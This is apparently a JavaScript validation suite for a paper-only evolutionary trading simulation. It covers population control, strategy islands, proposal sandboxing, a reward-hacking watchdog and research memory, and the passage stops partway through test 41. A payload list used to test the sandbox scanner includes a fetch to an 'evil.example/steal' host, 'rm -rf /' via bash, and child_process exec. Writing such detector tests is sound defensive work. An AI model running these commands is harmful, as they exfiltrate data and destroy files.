#!/usr/bin/env node
/**
 * EVOLVE Phase 5A validation suite — Controlled Research Swarm.
 *
 * Covers: configurable population (48/96/192 + arbitrary), strategy islands
 * (targets, migration, cross-species crossover, revival), the research
 * proposal schema + sandbox, the deterministic proposal compiler, research
 * memory persistence, the reward-hacking watchdog + quarantine, Arena-gated
 * promotion, ACTIVE/REDUCED_RISK/ABSTAIN, the shared market feed, and the
 * paper-only/no-execution guarantee.
 *
 * Dependency-free and fully offline (the default `mock` research provider
 * needs no LLM API key and no network) — same convention as
 * validate-arena.mjs / validate-phase41.mjs.
 *
 * Run with: npm run validate:phase5a
 */

import { mkdir, mkdtemp, rm, readdir, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { createMarketConfig } from "./market/config.mjs";
import { createMarketFeed } from "./market/feed.mjs";
import { createSeededRandom } from "./lib/random.mjs";
import { digestOf } from "./lib/hash.mjs";
import { PAPER_ONLY } from "./engine/paper.mjs";
import { createSimulation } from "./engine/simulation.mjs";
import { SPECIES, GENOME_KEYS, GENE_BOUNDS, randomGenome } from "./engine/genome.mjs";
import {
  islandTargetCounts,
  allocateBirths,
  allocateIslandBirths,
  islandDiversityPolicy,
  islandEvidenceWeight,
  islandReproductiveWeights,
  islandSoftTargets,
  largestRemainderAllocation,
  pickOtherIsland,
  ISLAND_DIVERSITY_DEFAULTS,
} from "./engine/islands.mjs";
import { ABSTAIN_STATE, abstentionDecision, riskMultiplierFor, FAMILY_NAMES, resolveFamily } from "./engine/families.mjs";
import { REGIMES, DEFAULT_DEPLOYMENT_GATES, ARENA_SCORE_VERSION } from "./arena/orchestrator.mjs";
import {
  validateProposal,
  containsExecutableArtifact,
  RESEARCHER_ROLES,
  PROPOSAL_SCHEMA_VERSION,
} from "./research/proposal-schema.mjs";
import { compileProposals, COMPILER_LIMITS } from "./research/compiler.mjs";
import { evaluateCandidate, WATCHDOG_VERDICT, parameterBoundarySaturation, clearQuarantine } from "./research/watchdog.mjs";
import {
  MEMORY_STATUS,
  saveProposal,
  listProposals,
  appendMemoryRecord,
  readMemoryIndex,
  createMemoryRecord,
  appendConclusion,
  loadPriorConclusions,
  saveCompiledCandidate,
  listCompiledCandidates,
  normalizeWatchdogEvidence,
  readWatchdogEvaluations,
  summarizeResearchMemory,
  watchdogStats,
} from "./research/memory.mjs";
import {
  DASHBOARD_STATE_CONTRACT_VERSION,
  buildResearchState,
  readDashboardState,
  selectStateSource,
} from "./lib/dashboard-state.mjs";
import { mockProviderPropose, resolveResearchProvider } from "./research/provider.mjs";
import { runResearchCycle, buildEvidencePacket } from "./research/cycle.mjs";
import { promoteFromArenaLeaderboard, isQuarantined } from "./research/promote.mjs";

const cases = [];
function test(name, fn) {
  cases.push({ name, fn });
}
function fail(message) {
  throw new Error(message);
}
function assert(condition, message) {
  if (!condition) fail(message);
}
function assertEqual(actual, expected, message) {
  if (actual !== expected) fail(`${message} (expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)})`);
}
function assertFinite(value, message) {
  assert(Number.isFinite(value), `${message} (got ${value})`);
}
function assertNoNonFinite(value, pathLabel = "root") {
  if (value === null || value === undefined) return;
  if (typeof value === "number") {
    assert(Number.isFinite(value), `non-finite number at ${pathLabel}`);
    return;
  }
  if (Array.isArray(value)) {
    value.forEach((item, index) => assertNoNonFinite(item, `${pathLabel}[${index}]`));
    return;
  }
  if (typeof value === "object") {
    for (const [key, item] of Object.entries(value)) assertNoNonFinite(item, `${pathLabel}.${key}`);
  }
}

/* ============================================================================
 * Test fixtures
 * ==========================================================================*/

async function withTempRoot(fn) {
  const root = await mkdtemp(path.join(tmpdir(), "evolve-phase5a-"));
  try {
    return await fn(root);
  } finally {
    await rm(root, { recursive: true, force: true }).catch(() => {});
  }
}

async function runLiveSimulationGenerations({
  generations = 4,
  populationSize = 48,
  generationTicks = 15,
  envOverrides = {},
  seedLabel = "phase5a-live",
} = {}) {
  const config = createMarketConfig(
    {
      EVOLVE_MARKET_MODE: "synthetic",
      EVOLVE_POPULATION_SIZE: String(populationSize),
      EVOLVE_GENERATION_TICKS: String(generationTicks),
      EVOLVE_SYNTHETIC_UNIVERSE: "16",
      ...envOverrides,
    },
    { loadEnv: false },
  );
  const random = createSeededRandom(seedLabel);
  let clock = 1_760_000_000_000;
  const now = () => clock;
  const feed = createMarketFeed({
    config,
    fetchImpl: async () => {
      throw new Error("offline fixture only");
    },
    now,
    random,
  });
  const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });

  const ticks = generationTicks * generations + Math.ceil(generationTicks / 2);
  for (let i = 0; i < ticks; i += 1) {
    await feed.advance(clock);
    clock += config.engine.tickMs;
    simulation.advanceTick();
  }
  return { simulation, snapshot: simulation.snapshot() };
}

/**
 * Build an offline synthetic simulation directly (no ticks elapsed), for tests
 * that need the untouched initialization state or precise generation control.
 */
async function offlineSimulation({
  populationSize = 48,
  generationTicks = 10,
  envOverrides = {},
  seedLabel = "phase5a-offline",
} = {}) {
  const config = createMarketConfig(
    {
      EVOLVE_MARKET_MODE: "synthetic",
      EVOLVE_POPULATION_SIZE: String(populationSize),
      EVOLVE_GENERATION_TICKS: String(generationTicks),
      EVOLVE_SYNTHETIC_UNIVERSE: "16",
      ...envOverrides,
    },
    { loadEnv: false },
  );
  const random = createSeededRandom(seedLabel);
  let clock = 1_760_000_000_000;
  const now = () => clock;
  const feed = createMarketFeed({
    config,
    fetchImpl: async () => {
      throw new Error("offline fixture only");
    },
    now,
    random,
  });
  const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });
  const advance = async (ticks) => {
    for (let i = 0; i < ticks; i += 1) {
      await feed.advance(clock);
      clock += config.engine.tickMs;
      simulation.advanceTick();
    }
  };
  return { config, feed, simulation, advance, random };
}

async function writeJsonFixture(file, payload) {
  await mkdir(path.dirname(file), { recursive: true });
  await writeFile(file, `${JSON.stringify(payload, null, 2)}\n`, "utf8");
}

/**
 * A `.evolve/` directory exactly like the one the first 192-agent live run
 * left behind: a live Phase 5A state.json carrying `researchSwarm`, plus a much
 * older Phase 3 synthetic `session-demo` replay document and experiment report.
 */
async function writeLivePlusStalePhase3Fixture(root, { swarm } = {}) {
  const staleExperimentId = "exp-session-demo-20260917T085106Z-S-a7km";

  await writeJsonFixture(path.join(root, "state.json"), {
    updatedAt: "2026-09-17T17:45:35.472Z",
    mode: "PAPER",
    paperOnly: true,
    stats: { population: 192, alive: 192, bornTotal: 4000, terminatedTotal: 3808 },
    researchRegime: "weak-risk-on",
    islands: [{ name: "Momentum", population: 41, softTarget: 38, floor: 15, cap: 58 }],
    researchSwarm: swarm,
  });

  await writeJsonFixture(path.join(root, "replay-state.json"), {
    updatedAt: "2026-09-17T11:54:00.000Z",
    mode: "PAPER",
    paperOnly: true,
    research: {
      mode: "replay",
      banner: "HISTORICAL REPLAY • PAPER MONEY",
      stage: "TEST",
      dataset: { id: "session-demo", dataClass: "synthetic-only", usableForRealMarketReplay: false },
      replay: { finished: true, snapshotsRead: 263, speed: 1 },
    },
  });

  await writeJsonFixture(path.join(root, "experiments", staleExperimentId, "manifest.json"), {
    experimentId: staleExperimentId,
    createdAt: "2026-09-17T08:51:06.000Z",
    dataset: { id: "session-demo", dataClass: "synthetic-only" },
    paperOnly: true,
  });
  await writeJsonFixture(path.join(root, "experiments", staleExperimentId, "summary.json"), {
    experimentId: staleExperimentId,
    dataset: { id: "session-demo", dataClass: "synthetic-only" },
    seeds: ["evolve"],
    windows: 1,
    champions: 0,
    paperOnly: true,
  });

  return { staleExperimentId };
}

function liveSwarmFixture(overrides = {}) {
  return {
    enabled: true,
    provider: "mock",
    cycle: 11,
    regime: "weak-risk-on",
    proposalsGenerated: 66,
    proposalsAccepted: 66,
    proposalsRejected: 0,
    compiledCandidates: 33,
    compiledFamilies: 33,
    injectedCandidates: 3,
    memoryRecords: 46,
    conclusions: 13,
    evaluations: 13,
    researcherRoles: { "signal-researcher": 16, "execution-researcher": 22 },
    watchdog: { normal: 6, watch: 7, quarantined: 0, evaluated: 13, lastEvaluatedAt: "2026-09-17T17:45:35.472Z" },
    lastRunAt: "2026-09-17T17:45:35.472Z",
    lastError: null,
    log: [],
    ...overrides,
  };
}

function validProposal(overrides = {}) {
  return {
    schemaVersion: PROPOSAL_SCHEMA_VERSION,
    proposalId: overrides.proposalId ?? "P-test-0001",
    authorRole: overrides.authorRole ?? "signal-researcher",
    hypothesis: overrides.hypothesis ?? "Momentum combined with wallet flow persists when organic buyers keep accumulating.",
    targetRegimes: overrides.targetRegimes ?? ["weak-risk-on"],
    abstainRegimes: overrides.abstainRegimes ?? [],
    parentFamilies: overrides.parentFamilies ?? ["Momentum x Wallet Flow"],
    changes: overrides.changes ?? { momentumWeight: [0.3, 0.5], flowWeight: 0.4 },
    rationale: overrides.rationale ?? "derived from observed regime and family statistics in this cycle",
    risks: overrides.risks ?? ["regime dependence"],
  };
}

/* ============================================================================
 * 1. Configurable population
 * ==========================================================================*/

for (const populationSize of [48, 96, 192]) {
  test(`1. Population stays at exactly ${populationSize} across generations`, async () => {
    const { snapshot } = await runLiveSimulationGenerations({ populationSize, generations: 3, generationTicks: 12 });
    assertEqual(snapshot.stats.population, populationSize, "population target must match EVOLVE_POPULATION_SIZE");
    assertEqual(snapshot.stats.alive, populationSize, "alive count must equal the configured population size");
    assert(snapshot.generation >= 2, `expected multiple generations to elapse, got generation ${snapshot.generation}`);
  });
}

test("2. An arbitrary sensible population (130) stays fixed across generations", async () => {
  const { snapshot } = await runLiveSimulationGenerations({ populationSize: 130, generations: 3, generationTicks: 12 });
  assertEqual(snapshot.stats.alive, 130, "arbitrary population size must be preserved exactly");
});

test("3. Invalid population values are rejected safely (clamped into range, never NaN)", () => {
  const tooSmall = createMarketConfig({ EVOLVE_POPULATION_SIZE: "-5" }, { loadEnv: false });
  assert(Number.isFinite(tooSmall.engine.population) && tooSmall.engine.population >= 12, "negative population must clamp to the minimum, not crash or go negative");

  const notANumber = createMarketConfig({ EVOLVE_POPULATION_SIZE: "banana" }, { loadEnv: false });
  assertEqual(notANumber.engine.population, 96, "non-numeric population must fall back to the documented default");

  const tooLarge = createMarketConfig({ EVOLVE_POPULATION_SIZE: "999999" }, { loadEnv: false });
  assert(tooLarge.engine.population <= 512, "oversized population must clamp to the maximum");
});

test("4. EVOLVE_POPULATION_SIZE and the legacy EVOLVE_POPULATION both work; the new name wins when both are set", () => {
  const legacyOnly = createMarketConfig({ EVOLVE_POPULATION: "64" }, { loadEnv: false });
  assertEqual(legacyOnly.engine.population, 64, "legacy EVOLVE_POPULATION must still work");

  const newOnly = createMarketConfig({ EVOLVE_POPULATION_SIZE: "72" }, { loadEnv: false });
  assertEqual(newOnly.engine.population, 72, "EVOLVE_POPULATION_SIZE must work");

  const both = createMarketConfig({ EVOLVE_POPULATION_SIZE: "80", EVOLVE_POPULATION: "40" }, { loadEnv: false });
  assertEqual(both.engine.population, 80, "EVOLVE_POPULATION_SIZE must take priority when both are set");
});

test("5. Births restore the exact population after every selection (birth/death bookkeeping consistent)", async () => {
  const { snapshot } = await runLiveSimulationGenerations({ populationSize: 48, generations: 4, generationTicks: 10 });
  const { bornTotal, terminatedTotal, population } = snapshot.stats;
  assertEqual(bornTotal - terminatedTotal, population, "born - terminated must equal the current population every tick");
});

test("6. Same seed/config initializes deterministically (byte-identical first snapshot)", async () => {
  const runOnce = async () => {
    const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: "48", EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
    const random = createSeededRandom("phase5a-determinism");
    const now = () => 1_760_000_000_000;
    const feed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
    await feed.advance(now());
    const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });
    return simulation.snapshot().topAgents.map((a) => ({ species: a.species, genome: a.genome }));
  };
  const a = await runOnce();
  const b = await runOnce();
  assertEqual(JSON.stringify(a), JSON.stringify(b), "identical seed/config must produce identical initial population");
});

/* ============================================================================
 * 2. Strategy islands
 * ==========================================================================*/

test("7. islandTargetCounts splits evenly across 6 islands for 48/96/192 (8/16/32 each)", () => {
  for (const [populationSize, expectedEach] of [[48, 8], [96, 16], [192, 32]]) {
    const targets = islandTargetCounts(populationSize, SPECIES, {});
    for (const name of SPECIES) assertEqual(targets[name], expectedEach, `${name} target at population ${populationSize}`);
    assertEqual(Object.values(targets).reduce((a, b) => a + b, 0), populationSize, "targets must sum exactly to the population");
  }
});

test("8. islandTargetCounts always sums exactly to the population, for arbitrary sizes and explicit weights", () => {
  for (const populationSize of [1, 5, 47, 130, 500]) {
    const targets = islandTargetCounts(populationSize, SPECIES, {});
    assertEqual(Object.values(targets).reduce((a, b) => a + b, 0), populationSize, `sum mismatch at population ${populationSize}`);
  }
  const weighted = islandTargetCounts(96, SPECIES, { "Genesis Hunter": 30, Momentum: 10 });
  assertEqual(Object.values(weighted).reduce((a, b) => a + b, 0), 96, "explicit weights must still sum exactly to the population");
  assert(weighted["Genesis Hunter"] > weighted.Liquidity, "an island with a larger explicit weight must receive a larger share");
});

test("9. largestRemainderAllocation never returns negative or non-integer counts", () => {
  const result = largestRemainderAllocation({ a: 1, b: 2, c: 0 }, 7);
  for (const value of Object.values(result)) {
    assert(Number.isInteger(value) && value >= 0, `allocation must be a non-negative integer, got ${value}`);
  }
  assertEqual(Object.values(result).reduce((x, y) => x + y, 0), 7, "allocation must sum exactly to the requested total");
});

test("10. allocateBirths gives zero to islands already at/above target and distributes the rest exactly", () => {
  const deficits = { A: -5, B: 3, C: 2 };
  const allocation = allocateBirths(deficits, 5);
  assertEqual(allocation.A ?? 0, 0, "an over-target island must receive zero births");
  assertEqual((allocation.B ?? 0) + (allocation.C ?? 0), 5, "the full birth budget must land on under-target islands");
});

test("11. Island populations stay near their target across many generations (192 population, 6 islands)", async () => {
  const { snapshot } = await runLiveSimulationGenerations({ populationSize: 192, generations: 5, generationTicks: 10 });
  assert(Array.isArray(snapshot.islands) && snapshot.islands.length === SPECIES.length, "snapshot must report one row per island");
  const totalPop = snapshot.islands.reduce((sum, island) => sum + island.population, 0);
  assertEqual(totalPop, 192, "island populations must sum to the total population");
  for (const island of snapshot.islands) {
    assert(Math.abs(island.population - island.target) <= island.target, `island ${island.name} population ${island.population} drifted implausibly far from target ${island.target}`);
  }
});

test("12. pickOtherIsland always returns a different island than the one excluded, or null if none exists", () => {
  const random = createSeededRandom("pick-other");
  for (let i = 0; i < 50; i += 1) {
    const other = pickOtherIsland(SPECIES, "Momentum", random);
    assert(other !== "Momentum", "must never return the excluded island");
    assert(SPECIES.includes(other), "must return a real island name");
  }
  assertEqual(pickOtherIsland(["Solo"], "Solo", random), null, "must return null when no other island exists");
});

test("13. Migration is bounded by EVOLVE_ISLAND_MAX_MIGRATIONS (never exceeds the cap in one generation)", async () => {
  const { snapshot } = await runLiveSimulationGenerations({
    populationSize: 96,
    generations: 3,
    generationTicks: 10,
    envOverrides: { EVOLVE_ISLAND_MAX_MIGRATIONS: "2", EVOLVE_ISLAND_MIGRATION_RATE: "1" },
  });
  const totalMigrationsIn = snapshot.islands.reduce((sum, island) => sum + island.migrationsIn, 0);
  // Bounded per generation, and several generations elapsed — this only checks
  // the cap actually constrains the total rather than growing unbounded with
  // migrationRate=1 (every survivor would migrate every generation otherwise).
  assert(totalMigrationsIn <= 2 * snapshot.generation, `migrations ${totalMigrationsIn} exceeded the per-generation cap over ${snapshot.generation} generations`);
});

test("14. Disabling islands (EVOLVE_ISLANDS_ENABLED=false) still keeps the population exact", async () => {
  const { snapshot } = await runLiveSimulationGenerations({
    populationSize: 60,
    generations: 3,
    generationTicks: 10,
    envOverrides: { EVOLVE_ISLANDS_ENABLED: "false" },
  });
  assertEqual(snapshot.stats.alive, 60, "population must stay exact even with islands disabled");
});

/* ============================================================================
 * 3. Research proposal schema + sandbox
 * ==========================================================================*/

test("15. A well-formed proposal is accepted", () => {
  const { ok, errors } = validateProposal(validProposal());
  assert(ok, `expected a valid proposal to be accepted, errors: ${errors.join("; ")}`);
});

test("16. An unknown top-level field is rejected", () => {
  const { ok, errors } = validateProposal({ ...validProposal(), smuggledField: "anything" });
  assert(!ok, "a proposal with an unknown top-level field must be rejected");
  assert(errors.some((e) => e.includes("smuggledField")), "the rejection reason must name the offending field");
});

test("17. An unsupported genome field inside `changes` is rejected", () => {
  const { ok, errors } = validateProposal(validProposal({ changes: { notARealGene: 0.5 } }));
  assert(!ok, "an unsupported gene must be rejected");
  assert(errors.some((e) => e.includes("notARealGene")), "the rejection reason must name the offending gene");
});

test("18. A gene range that escapes GENE_BOUNDS is rejected", () => {
  const { ok } = validateProposal(validProposal({ changes: { riskFraction: [0.9, 0.99] } }));
  assert(!ok, "a range outside GENE_BOUNDS must be rejected");
});

const EXECUTABLE_PAYLOADS = [
  "eval('1+1')",
  "require('child_process').exec('ls')",
  "process.exit(1)",
  "() => fetch('http://evil.example/steal')",
  "javascript:alert(1)",
  "import('node:fs')",
  "bash -c 'rm -rf /'",
  "new Function('return 1')()",
  "${7*7}",
];

for (const payload of EXECUTABLE_PAYLOADS) {
  test(`19. Executable-looking content is rejected: ${JSON.stringify(payload).slice(0, 40)}`, () => {
    assert(containsExecutableArtifact(payload), `sandbox scan must flag: ${payload}`);
    const { ok } = validateProposal(validProposal({ hypothesis: `${payload} and organic buyers keep accumulating steadily` }));
    assert(!ok, `a proposal with executable content in hypothesis must be rejected: ${payload}`);
  });
}

test("20. Shell content specifically is rejected (bash / sh -c / cmd.exe)", () => {
  for (const shell of ["bash -c 'echo hi'", "sh -c 'echo hi'", "cmd.exe /c dir"]) {
    assert(containsExecutableArtifact(shell), `must flag shell content: ${shell}`);
  }
});

test("21. Every RESEARCHER_ROLES entry is a valid authorRole and produces an acceptable proposal", () => {
  for (const role of RESEARCHER_ROLES) {
    const { ok, errors } = validateProposal(validProposal({ authorRole: role, proposalId: `P-role-${role}` }));
    assert(ok, `role ${role} must produce a valid proposal, errors: ${errors.join("; ")}`);
  }
});

test("22. A binary gene proposed as a non-degenerate range is rejected", () => {
  const { ok } = validateProposal(validProposal({ changes: { contrarian: [0, 1] } }));
  assert(!ok, "a binary gene range must be pinned to [0,0] or [1,1], not a spread range");
});

/* ============================================================================
 * 4. Deterministic proposal compiler
 * ==========================================================================*/

test("23. Deterministic compilation: the same proposal compiles to a byte-identical genome every time", () => {
  const proposal = validProposal();
  const a = compileProposals({ proposals: [proposal] });
  const b = compileProposals({ proposals: [proposal] });
  assertEqual(JSON.stringify(a.compiled), JSON.stringify(b.compiled), "identical proposal input must compile identically");
  assert(a.compiled.length === 1, "expected exactly one compiled candidate");
});

test("24. Compiled genomes never exceed GENE_BOUNDS and carry only known genome keys", () => {
  const proposal = validProposal({ changes: { riskFraction: 0.2, stopLoss: 0.03 } });
  const { compiled } = compileProposals({ proposals: [proposal] });
  assert(compiled.length === 1, "expected a compiled candidate");
  const genome = compiled[0].genome;
  for (const key of Object.keys(genome)) {
    assert(GENOME_KEYS.includes(key), `compiled genome has an unknown key: ${key}`);
    const [lo, hi] = GENE_BOUNDS[key];
    assert(genome[key] >= lo && genome[key] <= hi, `compiled ${key}=${genome[key]} escapes GENE_BOUNDS [${lo}, ${hi}]`);
  }
});

test("25. The compiler's own limits are tighter than or equal to GENE_BOUNDS (risk/stop/take-profit/age)", () => {
  assert(COMPILER_LIMITS.maxRiskFraction <= GENE_BOUNDS.riskFraction[1], "compiler riskFraction ceiling must not exceed the gene bound");
  assert(COMPILER_LIMITS.minStopLoss >= GENE_BOUNDS.stopLoss[0], "compiler stopLoss floor must not be looser than the gene bound");
  assert(COMPILER_LIMITS.minTakeProfit >= GENE_BOUNDS.takeProfit[0], "compiler takeProfit floor must not be looser than the gene bound");

  const proposal = validProposal({ changes: { riskFraction: [0.24, 0.25], stopLoss: [0.01, 0.015] } });
  const { compiled } = compileProposals({ proposals: [proposal] });
  assert(compiled[0].genome.riskFraction <= COMPILER_LIMITS.maxRiskFraction, "compiled riskFraction must respect the compiler ceiling");
  assert(compiled[0].genome.stopLoss >= COMPILER_LIMITS.minStopLoss, "compiled stopLoss must respect the compiler floor");
});

test("26. An unresolvable parent family is rejected at compile time", () => {
  const proposal = validProposal({ parentFamilies: ["Not A Real Family"] });
  const { compiled, rejected } = compileProposals({ proposals: [proposal] });
  assertEqual(compiled.length, 0, "an unresolvable family must not compile");
  assertEqual(rejected.length, 1, "the rejection must be reported");
});

test("27. maxCompilations bounds the number of compiled candidates per cycle", () => {
  const proposals = FAMILY_NAMES.map((name, i) => validProposal({ proposalId: `P-cap-${i}`, parentFamilies: [name] }));
  const { compiled } = compileProposals({ proposals, maxCompilations: 2 });
  assertEqual(compiled.length, 2, "compilation must stop at maxCompilations");
});

test("28. Every CANDIDATE_FAMILIES name resolves via resolveFamily, including x/×/* separators", () => {
  for (const name of FAMILY_NAMES) {
    assert(resolveFamily(name), `family ${name} must resolve by its exact name`);
    assert(resolveFamily(name.replace(/\s*x\s*/, " × ")), `family ${name} must resolve with a × separator`);
  }
});

/* ============================================================================
 * 5. Research memory
 * ==========================================================================*/

test("29. Research memory persists and reloads proposals, memory records, and conclusions", async () => {
  await withTempRoot(async (root) => {
    const proposal = validProposal();
    await saveProposal(root, proposal, { status: MEMORY_STATUS.PROPOSED });
    const proposals = await listProposals(root);
    assertEqual(proposals.length, 1, "the saved proposal must be listable");
    assertEqual(proposals[0].proposal.proposalId, proposal.proposalId, "the reloaded proposal must match what was saved");

    const record = createMemoryRecord({ proposalId: proposal.proposalId, authorRole: proposal.authorRole, hypothesis: proposal.hypothesis, status: MEMORY_STATUS.TESTING });
    await appendMemoryRecord(root, record);
    const index = await readMemoryIndex(root);
    assertEqual(index.length, 1, "the memory record must be persisted and reloadable");

    await appendConclusion(root, { proposalId: proposal.proposalId, authorRole: proposal.authorRole, status: MEMORY_STATUS.TESTING, conclusion: "testing" });
    const conclusions = await loadPriorConclusions(root);
    assertEqual(conclusions.length, 1, "the conclusion must be persisted and reloadable");
  });
});

test("30. Research memory persists no secrets, non-finite numbers, or executable content on disk", async () => {
  await withTempRoot(async (root) => {
    const proposal = validProposal({ proposalId: "P-sanitize-1" });
    await saveProposal(root, proposal);
    const record = createMemoryRecord({ proposalId: proposal.proposalId, authorRole: proposal.authorRole, hypothesis: proposal.hypothesis, status: MEMORY_STATUS.TESTING, medianOosReturn: NaN, worstOosReturn: Infinity });
    await appendMemoryRecord(root, record);

    const files = [];
    async function walk(dir) {
      for (const entry of await readdir(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) await walk(full);
        else files.push(full);
      }
    }
    await walk(root);
    for (const file of files) {
      const text = await readFile(file, "utf8");
      assert(!/apiKey|secretKey|privateKey|JUPITER_API_KEY/i.test(text), `${file} must never contain a credential-shaped string`);
      assert(!/\bNaN\b|\bInfinity\b/.test(text), `${file} must never contain a non-finite JSON literal`);
      const parsed = JSON.parse(text);
      assertNoNonFinite(parsed, file);
    }
  });
});

test("31. Researchers consult memory: prior REJECTED proposals are referenced in the next cycle's rationale", () => {
  const priorConclusions = [{ proposalId: "P-old-1", authorRole: "signal-researcher", status: "REJECTED", conclusion: "single-mint dominance" }];
  const proposals = mockProviderPropose({
    evidence: { regimeDistribution: {}, costSummary: { meanCostDrag: 0.01 }, islandStats: [], priorConclusions },
    count: 6,
    seed: "memory-check",
    cycle: 2,
  });
  assert(proposals.some((p) => p.rationale.includes("P-old-1")), "at least one new proposal must reference the prior rejected proposal id");
});

test("32. Provider selection is FAIL-CLOSED: unset resolves to the offline mock, an explicit unknown name throws instead of falling back", () => {
  const unset = resolveResearchProvider();
  assertEqual(unset.name, "mock", "no provider name resolves to the offline mock default");
  assertEqual(unset.offline, true, "the default provider is offline");
  assertEqual(typeof unset.propose, "function", "the resolved mock provider is callable");
  assertEqual(resolveResearchProvider("mock").name, "mock", "explicit `mock` resolves to the offline mock");
  assertEqual(resolveResearchProvider("").name, "mock", "an empty name is treated as unspecified and defaults to mock");

  let thrown = null;
  try {
    resolveResearchProvider("some-llm-vendor");
  } catch (error) {
    thrown = error;
  }
  assert(thrown, "an explicit unregistered provider name must throw, never fall back to the mock");
  assertEqual(thrown.code, "UNKNOWN_RESEARCH_PROVIDER", "the error is the explicit fail-closed configuration error");
  assert(String(thrown.message).includes("some-llm-vendor"), "the error names the requested provider");
  const registered = [...thrown.registeredProviders].sort();
  assertEqual(JSON.stringify(registered), JSON.stringify(["deepseek-cline", "mock"]), "the error lists the registered providers");
});

/* ============================================================================
 * 6. Reward-hacking watchdog + quarantine
 * ==========================================================================*/

test("33. Single-mint dominance is flagged by the watchdog", () => {
  const evidence = { trades: 10, mintNotional: { mintA: 950, mintB: 50 }, costDrag: 0.01 };
  const result = evaluateCandidate(evidence, {});
  assert(result.flags.some((f) => f.flag === "single-mint-dominance"), "concentrated notional in one mint must be flagged");
});

test("34. Very-low trade count is flagged by the watchdog", () => {
  const evidence = { trades: 1, mintNotional: { mintA: 100 }, costDrag: 0.01 };
  const result = evaluateCandidate(evidence, { minTrades: 8 });
  assert(result.flags.some((f) => f.flag === "very-low-trade-count"), "trades below the configured minimum must be flagged");
});

test("35. Train -> OOS collapse is flagged by the watchdog", () => {
  const evidence = { trades: 10, mintNotional: { m: 100 }, trainReturn: 0.5, oosReturn: 0.02, costDrag: 0.01 };
  const result = evaluateCandidate(evidence, {});
  assert(result.flags.some((f) => f.flag === "train-oos-collapse"), "a large train->OOS gap must be flagged");
});

test("36. Stress collapse (0 of N stress profiles survived) is flagged by the watchdog", () => {
  const evidence = { trades: 10, mintNotional: { m: 100 }, stressTotal: 3, stressSurvived: 0, costDrag: 0.01 };
  const result = evaluateCandidate(evidence, {});
  assert(result.flags.some((f) => f.flag === "stress-collapse"), "surviving zero stress profiles must be flagged");
});

test("37. Enough flags -> QUARANTINED; a couple of flags -> WATCH; a clean candidate -> NORMAL", () => {
  const clean = evaluateCandidate({ trades: 20, mintNotional: { a: 40, b: 30, c: 30 }, costDrag: 0.01 }, {});
  assertEqual(clean.verdict, WATCHDOG_VERDICT.NORMAL, "a clean candidate must be NORMAL");

  const quarantined = evaluateCandidate(
    { trades: 1, mintNotional: { a: 100 }, costDrag: 0.5, trainReturn: 0.5, oosReturn: 0.01, stressTotal: 2, stressSurvived: 0 },
    { minTrades: 8 },
  );
  assertEqual(quarantined.verdict, WATCHDOG_VERDICT.QUARANTINED, "a candidate with many independent flags must be QUARANTINED");
});

test("38. QUARANTINED candidates can never self-clear; clearance requires a fresh NORMAL/WATCH evaluation", () => {
  const quarantined = { verdict: WATCHDOG_VERDICT.QUARANTINED };
  assertEqual(clearQuarantine(quarantined, { verdict: WATCHDOG_VERDICT.QUARANTINED }), false, "a repeat QUARANTINED verdict must not clear");
  assertEqual(clearQuarantine(quarantined, { verdict: WATCHDOG_VERDICT.NORMAL }), true, "a fresh NORMAL verdict must clear a prior quarantine");
});

test("39. parameterBoundarySaturation correctly detects genes pinned at their bounds", () => {
  const genome = randomGenome("Momentum", createSeededRandom("saturation-check"));
  genome.riskFraction = GENE_BOUNDS.riskFraction[1];
  genome.stopLoss = GENE_BOUNDS.stopLoss[0];
  const { share, saturated } = parameterBoundarySaturation(genome);
  assert(saturated.includes("riskFraction") && saturated.includes("stopLoss"), "pinned genes must be detected");
  assertFinite(share, "saturation share must be finite");
});

/* ============================================================================
 * 7. Controlled recursive research cycle (propose -> validate -> compile ->
 *    watchdog -> memory -> next cycle), and Arena-gated promotion
 * ==========================================================================*/

test("40. A full research cycle proposes, validates, compiles, and persists memory — offline, no LLM key", async () => {
  await withTempRoot(async (root) => {
    const evidence = buildEvidencePacket({ snapshot: { species: [], marketRegime: "NEUTRAL", researchRegime: "weak-risk-on", topAgents: [], paper: { costs: 1, startingCash: 100 }, stats: { population: 48 } }, islands: [], priorConclusions: [], cycle: 1 });
    const report = await runResearchCycle({ root, evidence, cycle: 1, seed: "cycle-test", proposalsPerCycle: 6, maxCompilations: 3 });
    assertEqual(report.proposed, 6, "the mock provider must produce the requested number of proposals");
    assert(report.compiled.length > 0, "at least one proposal should compile with valid inputs");
    assert(report.compiled.length <= 3, "compiled candidates must respect maxCompilations");

    const proposals = await listProposals(root);
    assert(proposals.length >= report.compiled.length, "compiled candidates must have a persisted proposal record");
    const compiledCandidates = await listCompiledCandidates(root);
    assertEqual(compiledCandidates.length, report.compiled.length, "every compiled candidate must be persisted for later Arena matching");

    const memory = await readMemoryIndex(root);
    assert(memory.length > 0, "the cycle must write research memory records");
    for (const record of memory) {
      assert(
        [MEMORY_STATUS.PROPOSED, MEMORY_STATUS.TESTING, MEMORY_STATUS.REJECTED].includes(record.status),
        `a research cycle must never itself write status ${record.status} — only PROPOSED/TESTING/REJECTED`,
      );
    }
  });
});

test("41. A research cycle never writes PROMISING, ARENA_SURVIVOR, or SHADOW_ELIGIBLE — researchers cannot self-promote", async () => {
  await withTempRoot(async (root) => {
    const evidence = buildEvidencePacket({ snapshot: { species: [], researchRegime: "sideways-chop", topAgents: [], paper: { costs: 0, startingCash: 100 }, stats: { population: 48 } }, islands: [], priorConclusions: [], cycle: 1 });
    for (let cycle = 1; cycle <= 3; cycle += 1) {
      await runResearchCycle({ root, evidence: { ...evidence, researchCycle: cycle }, cycle, seed: "no-self-promote", proposalsPerCycle: 6, maxCompilations: 3 });
    }
    const memory = await readMemoryIndex(root, { limit: 1000 });
